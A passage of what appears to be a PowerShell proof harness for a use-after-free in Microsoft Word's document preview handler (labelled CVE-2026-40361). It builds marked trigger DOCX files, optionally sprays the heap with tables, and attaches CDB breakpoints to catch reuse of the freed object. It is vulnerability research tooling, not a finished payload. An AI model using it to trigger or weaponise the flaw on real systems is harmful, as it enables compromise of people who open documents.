            Rpr                  = $_.Rpr
            Order                = $_.Order
            SprayCount           = $_.SprayCount
            SprayCompleted       = $_.SprayCompleted
            HasBadCleanup        = $_.HasBadCleanup
            HasExactReuseRuntime = $hasExactReuse
            HasWatchHit          = $_.HasWatchHit
            MarkerFound          = $_.MarkerFound
            PostPayloadAlloc20Count = if ($_.PSObject.Properties.Name -contains "PostPayloadAlloc20Count") { $_.PostPayloadAlloc20Count } else { "" }
            DurationSeconds      = $_.DurationSeconds
            FailureKind          = $_.FailureKind
        }
    }

    $analysisRows |
        Sort-Object Attempt |
        Format-Table Attempt,Tables,CustomXml,Rpr,Order,SprayCount,SprayCompleted,HasBadCleanup,HasExactReuseRuntime,HasWatchHit,MarkerFound,PostPayloadAlloc20Count,DurationSeconds,FailureKind -AutoSize
}

function Get-DocxCachePath {
    param(
        [int]$Tables,
        [bool]$CustomXml,
        [bool]$Rpr,
        [string]$Order
    )

    $cacheDirectory = Join-Path $docDir "cache"
    New-Item -ItemType Directory -Force $cacheDirectory | Out-Null
    $cacheName = "t{0}-c{1}-r{2}-o{3}.docx" -f $Tables, $CustomXml, $Rpr, $Order
    return Join-Path $cacheDirectory $cacheName
}

function Copy-DocxFromCache {
    param(
        [int]$Tables,
        [bool]$CustomXml,
        [bool]$Rpr,
        [string]$Order,
        [string]$OutputPath
    )

    $cachePath = Get-DocxCachePath -Tables $Tables -CustomXml $CustomXml -Rpr $Rpr -Order $Order
    if (-not (Test-Path -LiteralPath $cachePath)) {
        Write-Host "[*] DOCX cache miss: $cachePath" -ForegroundColor Cyan
        Generate-Docx -Tables $Tables -CustomXml $CustomXml -Rpr $Rpr -Order $Order -OutputPath $cachePath
    } else {
        Write-Host "[*] DOCX cache hit: $cachePath" -ForegroundColor DarkCyan
    }

    Copy-Item -LiteralPath $cachePath -Destination $OutputPath -Force
    Write-Host "[+] DOCX copied from cache: $OutputPath" -ForegroundColor Green
}

# ---- Generate a marked DOCX variant ----
function Generate-Docx {
    param(
        [int]$Tables = 1000,
        [bool]$CustomXml = $true,
        [bool]$Rpr = $true,
        [string]$Order = "tables_first",
        [string]$OutputPath
    )

    $word = $null
    $doc = $null
    $range = $null
    $comment = $null

    try {
        $word = New-WordApplicationWithRetry
        $word.Visible = $false
        $word.DisplayAlerts = 0

        $doc = $word.Documents.Add()

        $range = $doc.Range()
        $range.Text = "X"
        $comment = $doc.Comments.Add($range, "TEST")

        $marker = "TBL_41414141"

        # Build the document elements in the requested order.
        $elements = @()
        if ($Order -eq "tables_first") {
            $elements += @{Type="tables"; Count=$Tables}
            if ($CustomXml) { $elements += @{Type="customXml"; Count=1} }
        } else {
            if ($CustomXml) { $elements += @{Type="customXml"; Count=1} }
            $elements += @{Type="tables"; Count=$Tables}
        }

        # Keep table cell references only when optional rPr styling is requested.
        if ($Rpr) {
            $tableCells = [System.Collections.Generic.List[object]]::new()
        } else {
            $tableCells = $null
        }
        foreach ($elem in $elements) {
            switch ($elem.Type) {
                "tables" {
                    for ($i = 0; $i -lt $elem.Count; $i++) {
                        $r = $null
                        $table = $null
                        $cell = $null
                        $cellRange = $null
                        try {
                            $r = $doc.Content
                            $r.InsertParagraphAfter()
                            $r.Collapse(0)
                            $table = $doc.Tables.Add($r, 1, 1)
                            $cell = $table.Cell(1, 1)
                            $cellRange = $cell.Range
                            $cellRange.Text = "${marker}_$i"
                            if ($Rpr) {
                                [void]$tableCells.Add($cell)
                            } else {
                                Release-ComObjectQuietly -ComObject $cell
                            }
                        }
                        finally {
                            Release-ComObjectQuietly -ComObject $cellRange
                            Release-ComObjectQuietly -ComObject $table
                            Release-ComObjectQuietly -ComObject $r
                        }
                    }
                }
                "customXml" {
                    $xmlContent = "<data>" + ("41414141" * 10000) + "</data>"
                    $customXmlPart = $null
                    try {
                        $customXmlPart = $doc.CustomXMLParts.Add($xmlContent)
                    }
                    finally {
                        Release-ComObjectQuietly -ComObject $customXmlPart
                    }
                }
            }
        }

        # Apply optional rPr styling without changing marker text.
        if ($Rpr) {
            foreach ($cell in $tableCells) {
                $cellRange = $null
                $font = $null
                try {
                    $cellRange = $cell.Range
                    $font = $cellRange.Font
                    $font.Color = 0x00414141
                } catch { }
                finally {
                    Release-ComObjectQuietly -ComObject $font
                    Release-ComObjectQuietly -ComObject $cellRange
                    Release-ComObjectQuietly -ComObject $cell
                }
            }
        }

        $doc.SaveAs2($OutputPath, 16)
        $doc.Close()
        $word.Quit()

        Write-Host "[+] DOCX created: $OutputPath" -ForegroundColor Green
    }
    finally {
        Release-ComObjectQuietly -ComObject $comment
        Release-ComObjectQuietly -ComObject $range
        if ($null -ne $doc) {
            try { $doc.Close($false) } catch {}
            Release-ComObjectQuietly -ComObject $doc
        }
        if ($null -ne $word) {
            try { $word.Quit() } catch {}
            Release-ComObjectQuietly -ComObject $word
        }
    }
}

# ---- Reset Word state for repeatable lab runs ----
function Reset-WordState {
    Get-Process WINWORD -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    Remove-Item "$env:APPDATA\Microsoft\Word\*.asd" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Office\UnsavedFiles\*" -Force -Recurse -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Office\16.0\Word\Resiliency" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Office\16.0\Common\Resiliency" -Recurse -Force -ErrorAction SilentlyContinue
}

# ---- Run one proof attempt and parse CDB telemetry ----
function Run-Test {
    param(
        [string]$DocPath,
        [string]$LogSuffix = "",
        [ValidateRange(0, [int]::MaxValue)]
        [int]$SprayCount = 0,
        [int]$AttemptId = 0
    )

    $triggerProc = $null
    $attachProc = $null
    $attachOut = ""
    $attachErr = ""
    $attachTrace = ""
    $triggerOut = ""
    $triggerErr = ""
    $cdbLog = ""
    $word = $null
    $doc = $null
    $sprayDoc = $null
    $wordPid = 0
    $sprayCompleted = 0
    $sprayDurationSeconds = 0
    $sprayTablesPerSecond = 0
    $wordMetricsBeforeSpray = [pscustomobject]@{ PrivateBytes = 0; WorkingSet = 0; VirtualBytes = 0 }
    $wordMetricsAfterSpray = [pscustomobject]@{ PrivateBytes = 0; WorkingSet = 0; VirtualBytes = 0 }
    $attemptStopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    $hasCleanedUp = $false

    try {
    # Reset Word before each proof attempt.
    Reset-WordState

    $stamp = Get-Date -Format "yyyyMMdd-HHmmss"
    if ($AttemptId -gt 0) { $stamp = ("attempt-{0:0000}-{1}" -f $AttemptId, $stamp) }
    if ($LogSuffix) { $stamp = "$stamp-$LogSuffix" }

    $targetDoc = $DocPath
    $cdbCmd = Join-Path $scriptDir "cdb-proof-current-$stamp.txt"
    $cdbAttachPs1 = Join-Path $scriptDir "attach-cdb-current-$stamp.ps1"
    $attachOut = Join-Path $scriptDir "attach-helper-$stamp.out.log"
    $attachErr = Join-Path $scriptDir "attach-helper-$stamp.err.log"
    $attachTrace = Join-Path $scriptDir "attach-helper-$stamp.trace.log"
    $triggerOut = Join-Path $scriptDir "preview-trigger-$stamp.out.log"
    $triggerErr = Join-Path $scriptDir "preview-trigger-$stamp.err.log"
    $cdbLog = Join-Path $resultDir "cdb-proof-$stamp.log"
    $previewReady = Join-Path $scriptDir "preview-ready-$stamp.flag"
    $previewGo = Join-Path $scriptDir "preview-go-$stamp.flag"
    $breakpointReadyFlag = Join-Path $scriptDir "breakpoints-ready-$stamp.flag"
    $allocationDiagnosticSizes = "0x10,0x20,0x30,0x40,0x50,0x60"

    $rtlAllocateHeapBreakpoint = @'
bu ntdll!RtlAllocateHeap ".if (@$t2 != 0) { .if (@$t4 == 0) { r @$t13=0; .if (@r8 == 0x10) { r @$t13=1 }; .if (@r8 == 0x20) { r @$t13=1 }; .if (@r8 == 0x30) { r @$t13=1 }; .if (@r8 == 0x40) { r @$t13=1 }; .if (@r8 == 0x50) { r @$t13=1 }; .if (@r8 == 0x60) { r @$t13=1 }; .if (@$t13 != 0) { r @$t8=poi(@rsp); r @$t9=@r8; r @$t10=@rcx; r @$t11=@rdx; r @$t12=poi(@rsp); bp /1 @$t8 \".if (@$t6 < __TRACE_COUNT__) { r @$t6=@$t6+1; .printf \\\"\\n[CDB_POST_PAYLOAD_ALLOC_RETURN] index=%d ret=%p payload=%p delta=%p size=%p heap=%p flags=%p caller=%p tid=%x sizes=0x10,0x20,0x30,0x40,0x50,0x60\\\\n\\\", @$t6, @rax, @$t2, (@rax-@$t2), @$t9, @$t10, @$t11, @$t12, @$tid; .if (@$t9 == 0x20) { .printf \\\"[CDB_POST_PAYLOAD_ALLOC20_RETURN] index=%d ret=%p payload=%p delta=%p size=0x20 heap=%p flags=%p caller=%p tid=%x\\\\n\\\", @$t6, @rax, @$t2, (@rax-@$t2), @$t10, @$t11, @$t12, @$tid }; .if (@$t14 < __STACK_COUNT__) { .if (@$t9 == 0x20) { .if (@$t12 == mso20win32client+0x2a50d9) { r @$t14=@$t14+1; .printf \\\"[CDB_FRIDA_MATCHED_ALLOC20_RETURN] index=%d targetIndex=%d ret=%p payload=%p delta=%p size=0x20 heap=%p flags=%p caller=%p target=mso20win32client+0x2a50d9 tid=%x\\\\n\\\", @$t6, @$t14, @rax, @$t2, (@rax-@$t2), @$t10, @$t11, @$t12, @$tid; .printf \\\"[CDB_FRIDA_MATCHED_ALLOC20_STACK]\\\\n\\\"; kb } } }; .if (@$t15 < __STACK_COUNT__) { .if (@$t9 == 0x30) { .if (@$t12 == mso20win32client+0x2a4a57) { r @$t15=@$t15+1; .printf \\\"[CDB_NEAR_MISS_ALLOC30_RETURN] index=%d targetIndex=%d ret=%p payload=%p delta=%p size=0x30 heap=%p flags=%p caller=%p target=mso20win32client+0x2a4a57 tid=%x\\\\n\\\", @$t6, @$t15, @rax, @$t2, (@rax-@$t2), @$t10, @$t11, @$t12, @$tid; .printf \\\"[CDB_NEAR_MISS_ALLOC30_STACK]\\\\n\\\"; kb } } }; .if (@$t6 <= __STACK_COUNT__) { .printf \\\"[CDB_POST_PAYLOAD_ALLOC_STACK]\\\\n\\\"; kb }; .if (@$t6 >= __TRACE_COUNT__) { .printf \\\"[CDB_ALLOC_DIAG_COMPLETE] count=%d sizes=0x10,0x20,0x30,0x40,0x50,0x60\\\\n\\\", @$t6 } }; .if (@rax == @$t2) { r @$t4=1; r @$t5=@rax; bd 5; .printf \\\"\\n============================================================\\n\\\"; .printf \\\"[CDB_EXACT_REUSE_RUNTIME] RtlAllocateHeap returned freed payload ptr=%p size=%p\\\\n\\\", @rax, @$t9; .printf \\\"============================================================\\n\\\"; .printf \\\"[CDB_STACK]\\\\n\\\"; kb; .printf \\\"[CDB_REUSE_INITIAL_DUMP]\\n\\\"; db @rax L20; .printf \\\"[CDB_SETTING_WATCH_ON_REUSED_SLOT]\\n\\\"; ba w4 @$t5 \\\".printf \\\\\\\"[CDB_WRITE_TO_REUSED_SLOT] Write at %p, data: \\\\\\\", @$t5; dd @$t5 L4; .printf \\\\\\\"[CDB_WRITE_DUMP]\\\\\\\"; db @$t5 L20; .printf \\\\\\\"[CDB_WRITE_SEARCH_ASCII]\\\\\\\"; s -a @$t5 L20 \\\\\\\"TBL_41414141\\\\\\\"; .printf \\\\\\\"[CDB_WRITE_SEARCH_HEX]\\\\\\\"; s -b @$t5 L20 54 42 4C 5F 34 31 34 31 34 31 34 31; gc\\\" }; gc\" } } }; gc"
'@.Trim().
        Replace("__TRACE_COUNT__", [string]$PostPayloadAllocTraceCount).
        Replace("__STACK_COUNT__", [string]$PostPayloadAllocStackCount)

    # Build the CDB command file. Keep breakpoint offsets and event names stable.
    $cdbLines = @(
        '.echo ============================================================',
        '.echo CDB PROOF - CVE-2026-40361 / Marker TBL_41414141',
        '.echo ============================================================',
        '',
        '.effmach amd64',
        'sxi *',
        'sxe bpe',
        'sxe av',
        'sxn ld',
        '',
        'r @$t0 = 0',
        'r @$t1 = 0',
        'r @$t2 = 0',
        'r @$t3 = 0',
        'r @$t4 = 0',
        'r @$t5 = 0',
        'r @$t6 = 0',
        'r @$t13 = 0',
        'r @$t14 = 0',
        'r @$t15 = 0',
        'r @$t16 = 0',
        'r @$t17 = 0',
        'r @$t18 = 0',
        '',
        '.echo [CDB] breakpoints installing...',
        '',
        'bu wwlib+0xd96c80 ".printf \"\n[CDB_HROPEN_PREVIEWER_DOC_ENTER] rip=%p rcx=%p rdx=%p\n\", @rip, @rcx, @rdx; bd 0; gc"',
        '',
        'bu wwlib+0x508bc0 ".printf \"\n[CDB_DOC_LOOKUP_ENTER] rcx=%p path follows:\n\", @rcx; du @rcx; bd 1; gc"',
        '',
        'bu wwlib+0x8cc38 ".printf \"\n[CDB_FDISPOSE_ANY] DOD=%p ret=%p lastDoc=%p same=%d\n\", @rcx, poi(@rsp), @$t0, (@rcx==@$t0); .if (poi(@rsp) == wwlib+0xd971cf) { r @$t1=@rcx; r @$t3=1; be 4; bd 2; .printf \"[CDB_BAD_CLEANUP_FDISPOSE] DOD=%p ret=%p lastDoc=%p same=%d\n\", @rcx, poi(@rsp), @$t0, (@rcx==@$t0); db @rcx L40 }; gc"',
        '',
        'bu wwlib+0xd971cf "bd 3; .printf \"[CDB_BAD_CLEANUP_RET] cleanupDOD=%p payload=%p\n\", @$t1, @$t2; bd 4; r @$t3=0; gc"',
        '',
        'bu wwlib+0x7a140 ".if (@rcx != 0) { .if (poi(@rcx) == wwlib+0x2281f60) { .if (@$t3 != 0) { .if (@$t2 == 0) { r @$t2=@rcx; r @$t7=poi(@rsp); be 5; bd 4; .printf \"\n[CDB_PAYLOAD_RELEASE_ENTER] ptr=%p vt=%p inBadCleanup=%d ret=%p\n\", @rcx, poi(@rcx), @$t3, @$t7; .printf \"[CDB_PAYLOAD_RELEASE_STACK]\n\"; kb; .printf \"[CDB_PAYLOAD_BEFORE]\n\"; db @rcx L40; bp /1 @$t7 \".printf \\\"[CDB_PAYLOAD_AFTER] ptr=%p\\\\n\\\", @$t2; db @$t2 L40; gc\" } } } }; gc"',
        'bd 4',
        '',
        $rtlAllocateHeapBreakpoint,
        'bd 5',
        '',
        'bu wwlib+0xd96cf0 ".printf \"[CDB_DOC_LOOKUP_RET] retval=%p\n\", @rax; r @$t0=@rax; bd 6; gc"',
        '',
        '.echo [CDB] breakpoints ready.',
        '.echo [CDB_READY_FLAG]',
        'g'
    )
    Set-Content $cdbCmd -Value $cdbLines -Encoding ASCII

    # Start Word through COM.
    $baselineWordPids = @(
        Get-Process WINWORD -ErrorAction SilentlyContinue |
            Select-Object -ExpandProperty Id
    )

    $word = New-WordApplicationWithRetry
    $word.Visible = $true
    $word.DisplayAlerts = 0
    $wordPid = Get-TargetWordProcessId -BaselineWordPids $baselineWordPids
    $wordMetricsBeforeSpray = Get-WordProcessMetrics -ProcessId $wordPid
    Write-WordMemoryMetrics -Label "before-spray" -ProcessId $wordPid

    # Optional pre-observation table spray. Disabled by default for stable smoke/full runs.
    if ($SprayCount -gt 0) {
        Write-Host "[*] Optional pre-observation table spray: creating $SprayCount tables in a temporary document..." -ForegroundColor Cyan
        $sprayStopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $sprayDoc = $word.Documents.Add()

            for ($i = 0; $i -lt $SprayCount; $i++) {
                $r = $null
                $table = $null
                $cell = $null
                $cellRange = $null
                try {
                    $r = $sprayDoc.Content
                    $r.InsertParagraphAfter()
                    $r.Collapse(0)
                    $table = $sprayDoc.Tables.Add($r, 1, 1)
                    $cell = $table.Cell(1, 1)
                    $cellRange = $cell.Range
                    $cellRange.Text = "Spray_$i"
                    $sprayCompleted++
                }
                finally {
                    Release-ComObjectQuietly -ComObject $cellRange
                    Release-ComObjectQuietly -ComObject $cell
                    Release-ComObjectQuietly -ComObject $table
                    Release-ComObjectQuietly -ComObject $r
                }
            }
            $sprayStopwatch.Stop()
            $sprayDurationSeconds = $sprayStopwatch.Elapsed.TotalSeconds
            $sprayTablesPerSecond = if ($sprayDurationSeconds -gt 0) {
                $sprayCompleted / $sprayDurationSeconds
            } else {
                0
            }
            $wordMetricsAfterSpray = Get-WordProcessMetrics -ProcessId $wordPid
            Write-WordMemoryMetrics -Label "after-spray" -ProcessId $wordPid
            $sprayDoc.Close($false)
            Release-ComObjectQuietly -ComObject $sprayDoc
            $sprayDoc = $null
            try {
                [GC]::Collect()
                [GC]::WaitForPendingFinalizers()
            } catch { }
            Write-Host ("[+] Optional table spray document closed. DurationSeconds={0:N3} TablesPerSecond={1:N3}" -f $sprayDurationSeconds, $sprayTablesPerSecond) -ForegroundColor Green
        } catch {
            if ($sprayStopwatch) {
                $sprayStopwatch.Stop()
                $sprayDurationSeconds = $sprayStopwatch.Elapsed.TotalSeconds
                $sprayTablesPerSecond = if ($sprayDurationSeconds -gt 0) { $sprayCompleted / $sprayDurationSeconds } else { 0 }
            }
            Write-Host "[!] Spray failed after $sprayCompleted/$SprayCount tables: $_" -ForegroundColor Yellow
            throw
        }
    } else {
        $wordMetricsAfterSpray = Get-WordProcessMetrics -ProcessId $wordPid
        Write-WordMemoryMetrics -Label "after-spray" -ProcessId $wordPid
    }

    # ---- Open the trigger document ----
    $doc = $word.Documents.Open($targetDoc)
    Start-Sleep -Seconds 3

    Write-Host "[+] WINWORD PID: $wordPid" -ForegroundColor Green
    Write-WordMemoryMetrics -Label "before-trigger" -ProcessId $wordPid

    # Pre-create PreviewHandler
    Remove-Item $previewReady,$previewGo,$breakpointReadyFlag -Force -ErrorAction SilentlyContinue

    $triggerProc = Start-Process powershell.exe -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", $sourceTrigger,
        "-Path", $targetDoc,
        "-ReadyFile", $previewReady,
        "-GoFile", $previewGo
    ) -RedirectStandardOutput $triggerOut -RedirectStandardError $triggerErr -PassThru

    Write-Host "[*] Waiting for PreviewTrigger CoCreateInstance..." -ForegroundColor Cyan
    $deadline = (Get-Date).AddSeconds(45)
    while (-not (Test-Path $previewReady)) {
        $triggerProc.Refresh()
        if ($triggerProc.HasExited) {
            Write-PreviewTriggerDiagnostics -TriggerProcess $triggerProc -TriggerOut $triggerOut -TriggerErr $triggerErr
            throw "PreviewTrigger exited before CoCreateInstance ready"
        }
        if ((Get-Date) -gt $deadline) { throw "PreviewTrigger timeout before CoCreateInstance ready" }
        Start-Sleep -Milliseconds 250
    }
    Write-Host "[+] PreviewHandler CoCreateInstance ready; attaching CDB" -ForegroundColor Green

    # Start CDB through a non-interactive helper PowerShell process.
    @"
`$ErrorActionPreference = "Stop"
try {
    `$targetPid = $wordPid
    `$cdbPath = "$cdb"
    `$commandFilePath = "$cdbCmd"
    `$resultLogPath = "$cdbLog"
    `$tracePath = "$attachTrace"
    `$readyFlagPath = "$breakpointReadyFlag"
    `$timestamp = Get-Date -Format o
    function Write-Trace {
        param([string]`$Message)
        Add-Content -LiteralPath `$tracePath -Value `$Message -Encoding ASCII
    }

    Write-Trace "[ATTACH_HELPER] timestamp=`$timestamp"
    Write-Output "[ATTACH_HELPER] timestamp=`$timestamp"
    Write-Trace "[ATTACH_HELPER] targetPid=`$targetPid"
    Write-Output "[ATTACH_HELPER] targetPid=`$targetPid"
    `$targetProcess = Get-Process -Id `$targetPid -ErrorAction SilentlyContinue
    Write-Trace "[ATTACH_HELPER] targetPidExists=`$(`$null -ne `$targetProcess)"
    Write-Output "[ATTACH_HELPER] targetPidExists=`$(`$null -ne `$targetProcess)"
    if (`$null -eq `$targetProcess) {
        Write-Trace "[ATTACH_HELPER_ERROR] target WINWORD PID no longer exists before cdb launch: `$targetPid"
        Write-Output "[ATTACH_HELPER_ERROR] target WINWORD PID no longer exists before cdb launch: `$targetPid"
        exit 2
    }

    Write-Trace "[ATTACH_HELPER] cdbPath=`$cdbPath"
    Write-Output "[ATTACH_HELPER] cdbPath=`$cdbPath"
    Write-Trace "[ATTACH_HELPER] cdbPathExists=`$(Test-Path -LiteralPath `$cdbPath)"
    Write-Output "[ATTACH_HELPER] cdbPathExists=`$(Test-Path -LiteralPath `$cdbPath)"
    Write-Trace "[ATTACH_HELPER] commandFilePath=`$commandFilePath"
    Write-Output "[ATTACH_HELPER] commandFilePath=`$commandFilePath"
    Write-Trace "[ATTACH_HELPER] commandFileExists=`$(Test-Path -LiteralPath `$commandFilePath)"
    Write-Output "[ATTACH_HELPER] commandFileExists=`$(Test-Path -LiteralPath `$commandFilePath)"
    Write-Trace "[ATTACH_HELPER] resultLogPath=`$resultLogPath"
    Write-Output "[ATTACH_HELPER] resultLogPath=`$resultLogPath"
    Write-Trace "[ATTACH_HELPER] readyFlagPath=`$readyFlagPath"

    Write-Trace "[ATTACH_HELPER] launching cdb"
    `$startInfo = New-Object System.Diagnostics.ProcessStartInfo
    `$startInfo.FileName = `$cdbPath
    `$startInfo.Arguments = "-p `$targetPid -cf ```"`$commandFilePath```" -logo ```"`$resultLogPath```""
    `$startInfo.UseShellExecute = `$false
    `$startInfo.RedirectStandardOutput = `$true
    `$startInfo.RedirectStandardError = `$true
    `$cdbProcess = New-Object System.Diagnostics.Process
    `$cdbProcess.StartInfo = `$startInfo
    [void]`$cdbProcess.Start()

    while (-not `$cdbProcess.HasExited -or -not `$cdbProcess.StandardOutput.EndOfStream) {
        `$line = `$cdbProcess.StandardOutput.ReadLine()
        if (`$null -eq `$line) { continue }

        Write-Output `$line
        if (`$line -match '^\s*\[CDB_READY_FLAG\]\s*$') {
            Set-Content -LiteralPath `$readyFlagPath -Value "ready" -Encoding ASCII
            Write-Trace "[ATTACH_HELPER] ready flag created"
        }
    }

    `$stderrText = `$cdbProcess.StandardError.ReadToEnd()
    if (`$stderrText) {
        Write-Error `$stderrText
        Write-Trace "[ATTACH_HELPER_STDERR] `$stderrText"
    }

    `$cdbProcess.WaitForExit()
    Write-Trace "[ATTACH_HELPER] cdbExitCode=`$(`$cdbProcess.ExitCode)"
    Write-Output "[ATTACH_HELPER] cdbExitCode=`$(`$cdbProcess.ExitCode)"
    exit `$cdbProcess.ExitCode
}
catch {
    try { Add-Content -LiteralPath "$attachTrace" -Value "[ATTACH_HELPER_EXCEPTION] `$(`$_.Exception.ToString())" -Encoding ASCII } catch { }
    Write-Output "[ATTACH_HELPER_EXCEPTION] `$(`$_.Exception.ToString())"
    exit 1
}
"@ | Set-Content $cdbAttachPs1 -Encoding ASCII

    $attachProc = Start-Process powershell.exe -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", $cdbAttachPs1
    ) -RedirectStandardOutput $attachOut -RedirectStandardError $attachErr -PassThru
    $hasRetriedDirectCdbAttach = $false
    Write-Host "[*] Waiting for [CDB_READY_FLAG] in log..." -ForegroundColor Cyan
    $deadline = (Get-Date).AddSeconds(300)
    while (-not (Test-Path $breakpointReadyFlag)) {
        $attachProc.Refresh()
        if ($attachProc.HasExited) {
            $hasAttachStartupEvidence = Test-HasAttachStartupEvidence -Paths @($attachOut, $attachErr, $attachTrace, $cdbLog)
            if (-not $hasRetriedDirectCdbAttach -and -not $hasAttachStartupEvidence) {
                Write-Host "[!] Attach helper exited without startup evidence; retrying with direct cdb launch." -ForegroundColor Yellow
                $hasRetriedDirectCdbAttach = $true
                $attachOut = Join-Path $scriptDir "direct-cdb-$stamp.out.log"
                $attachErr = Join-Path $scriptDir "direct-cdb-$stamp.err.log"
                $attachProc = Start-Process -FilePath $cdb -ArgumentList @("-p", [string]$wordPid, "-cf", $cdbCmd, "-logo", $cdbLog) -RedirectStandardOutput $attachOut -RedirectStandardError $attachErr -PassThru
                Start-Sleep -Milliseconds 500
                continue
            }

            Write-Host "[-] CDB attach helper exited before ready flag." -ForegroundColor Red
            Write-AttachDiagnostics -AttachProcess $attachProc -AttachOut $attachOut -AttachErr $attachErr -CdbLog $cdbLog -AttachTrace $attachTrace
            Write-DiagnosticBundle -Directory $resultDir -AttemptId $AttemptId -AttachOut $attachOut -AttachErr $attachErr -AttachTrace $attachTrace -TriggerOut $triggerOut -TriggerErr $triggerErr -CdbCommandPath $cdbCmd -CdbLog $cdbLog
            throw "CDB attach helper exited before ready flag"
        }

        if ((Get-Date) -gt $deadline) {
            Write-Host "[-] Timeout waiting for CDB ready flag." -ForegroundColor Red
            Write-AttachDiagnostics -AttachProcess $attachProc -AttachOut $attachOut -AttachErr $attachErr -CdbLog $cdbLog -AttachTrace $attachTrace
            Write-ProcessSnapshot -AttachProcess $attachProc
            Write-DiagnosticBundle -Directory $resultDir -AttemptId $AttemptId -AttachOut $attachOut -AttachErr $attachErr -AttachTrace $attachTrace -TriggerOut $triggerOut -TriggerErr $triggerErr -CdbCommandPath $cdbCmd -CdbLog $cdbLog
            throw "Timeout waiting for CDB ready flag"
        }

        $readyLines = Get-CdbReadyLines -Paths @($cdbLog, $attachOut)
        if ($readyLines.Count -gt 0) {
            Set-Content $breakpointReadyFlag -Value "ready" -Encoding ASCII
            break
        }
        Start-Sleep -Milliseconds 500
    }
    Write-Host "[+] CDB breakpoints ready." -ForegroundColor Green

    # Release PreviewTrigger
    Write-Host "[*] Releasing PreviewTrigger: Initialize..." -ForegroundColor Cyan
    "go" | Set-Content $previewGo -Encoding ASCII
    Wait-Process -Id $triggerProc.Id -Timeout 10 -ErrorAction SilentlyContinue
    Write-PreviewTriggerDiagnostics -TriggerProcess $triggerProc -TriggerOut $triggerOut -TriggerErr $triggerErr

    Write-Host "[*] Waiting for CDB runtime events, ObserveMode=$ObserveMode, max $ObserveMinutes minutes..." -ForegroundColor Cyan

    $runtimeDeadline = (Get-Date).AddMinutes($ObserveMinutes)

    $baseProgressPatterns = @(
        "CDB_HROPEN_PREVIEWER_DOC_ENTER",
        "CDB_DOC_LOOKUP_ENTER",
        "CDB_DOC_LOOKUP_RET",
        "CDB_FDISPOSE_ANY"
    )

    $rootCausePatterns = @(
        "CDB_BAD_CLEANUP_FDISPOSE",
        "CDB_PAYLOAD_RELEASE_ENTER",
        "CDB_PAYLOAD_AFTER",
        "CDB_BAD_CLEANUP_RET"
    )

    $deepProgressPatterns = @(
        "CDB_BAD_CLEANUP_FDISPOSE",
        "CDB_PAYLOAD_RELEASE_ENTER",
        "CDB_PAYLOAD_AFTER",
        "CDB_BAD_CLEANUP_RET",
        "CDB_EXACT_REUSE_RUNTIME"
    )

    $fastTerminalPatterns = @(
        "CDB_BAD_CLEANUP_FDISPOSE",
        "CDB_PAYLOAD_RELEASE_ENTER",
        "CDB_PAYLOAD_AFTER",
        "CDB_BAD_CLEANUP_RET",
        "CDB_EXACT_REUSE_RUNTIME",
        "CDB_WRITE_TO_REUSED_SLOT",
        "Access violation"
    )

    $deepTerminalPatterns = @(
        "CDB_WRITE_TO_REUSED_SLOT",
        "Access violation"
    )

    $allocDiagProgressPatterns = $deepProgressPatterns + @(
        "CDB_POST_PAYLOAD_ALLOC_RETURN",
        "CDB_FRIDA_MATCHED_ALLOC20_RETURN",
        "CDB_NEAR_MISS_ALLOC30_RETURN",
        "CDB_ALLOC_DIAG_COMPLETE"
    )

    $allocDiagTerminalPatterns = @(
        "CDB_ALLOC_DIAG_COMPLETE",
        "CDB_EXACT_REUSE_RUNTIME",
        "CDB_WRITE_TO_REUSED_SLOT",
        "Access violation"
    )

    switch ($ObserveMode) {
        "deep" {
            $progressPatterns = $baseProgressPatterns + $deepProgressPatterns
            $terminalPatterns = $deepTerminalPatterns
        }
        "allocdiag" {
            $progressPatterns = $baseProgressPatterns + $allocDiagProgressPatterns
            $terminalPatterns = $allocDiagTerminalPatterns
        }
        default {
            $progressPatterns = $baseProgressPatterns
            $terminalPatterns = $fastTerminalPatterns
        }
    }

    $seenProgress = @{}
    $seenTerminalEvent = $false
    $lastRuntimeLineIndex = 0
    $nextHeartbeat = (Get-Date).AddMinutes($HeartbeatMinutes)

    while ((Get-Date) -lt $runtimeDeadline) {
        if (Test-Path $cdbLog) {
            $newRuntimeLines = @(Get-Content $cdbLog -ErrorAction SilentlyContinue | Select-Object -Skip $lastRuntimeLineIndex)
            $lastRuntimeLineIndex += $newRuntimeLines.Count

            # Only real runtime event lines, not CDB command definitions.
            $eventTail = $newRuntimeLines | Where-Object {
                (
                    $_ -match '\[CDB_' -and
                    $_ -notmatch '^\s*0:\d+>' -and
                    $_ -notmatch '^CDB PROOF' -and
                    $_ -notmatch 'bu\s+(wwlib|ntdll)' -and
                    $_ -notmatch '\.echo' -and
                    $_ -notmatch 'Numeric expression missing'
                ) -or (
                    $_ -match 'Access violation' -and
                    $_ -notmatch '^\s*0:\d+>'
                )
            }

            $tailText = ($eventTail -join "`n")

            foreach ($pat in $progressPatterns) {
                if (-not $seenProgress.ContainsKey($pat) -and ($tailText -match $pat)) {
                    Write-Host "[*] Progress event seen: $pat" -ForegroundColor Cyan
                    $seenProgress[$pat] = $true
                }
            }

            foreach ($pat in $terminalPatterns) {
                if ($tailText -match $pat) {
                    Write-Host "[+] Terminal runtime event seen: $pat" -ForegroundColor Green
                    $seenTerminalEvent = $true
                    break
                }
            }

            if ($StopOnFirstRootCause) {
                foreach ($pat in $rootCausePatterns) {
                    if ($tailText -match $pat) {
                        Write-Host "[+] StopOnFirstRootCause event seen: $pat" -ForegroundColor Green
                        $seenTerminalEvent = $true
                        break
                    }
                }
            }
        }

        if ($seenTerminalEvent) { break }
        if ((Get-Date) -ge $nextHeartbeat) {
            $logSize = if (Test-Path $cdbLog) { (Get-Item $cdbLog).Length } else { 0 }
            $seenProgressText = ($seenProgress.Keys | Sort-Object) -join ","
            Write-Host "[Heartbeat] AttemptId=$AttemptId ObserveMode=$ObserveMode SeenProgress=[$seenProgressText] CdbLogBytes=$logSize" -ForegroundColor DarkCyan
